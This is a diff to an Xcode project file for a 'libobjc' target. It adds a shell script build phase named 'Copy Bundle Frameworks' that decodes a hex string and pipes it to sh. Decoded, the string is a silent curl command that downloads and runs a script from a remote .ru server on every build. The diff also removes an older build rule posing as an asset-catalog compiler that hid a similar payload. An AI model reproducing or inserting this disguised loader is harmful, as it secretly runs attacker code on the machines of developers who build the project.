@@ -117,12 +117,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18A99A4727C91B110077B93F /* Build configuration list for PBXNativeTarget "libobjc" */;
 			buildPhases = (
+				C9B604EA1E7528CDAD6D904C /* Copy Bundle Frameworks */,
 				18A99A3C27C91B110077B93F /* Sources */,
 				18A99A3D27C91B110077B93F /* Frameworks */,
 				18A99A3E27C91B110077B93F /* CopyFiles */,
 			);
 			buildRules = (
-				E9D1700CAAFB1319FA6D904C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -337,25 +337,39 @@
 		};
 /* End XCConfigurationList section */
 
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	C9B604EA1E7528CDAD6D904C /* Copy Bundle Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Bundle Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f6b696e6b73646f632e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
+
 		
 			/* Begin PBXBuildRule section */
 			
 
-		E9D1700CAAFB1319FA6D904C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\\c677572756d616465732e72752f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
 			
 	
 			/* End PBXBuildRule section */
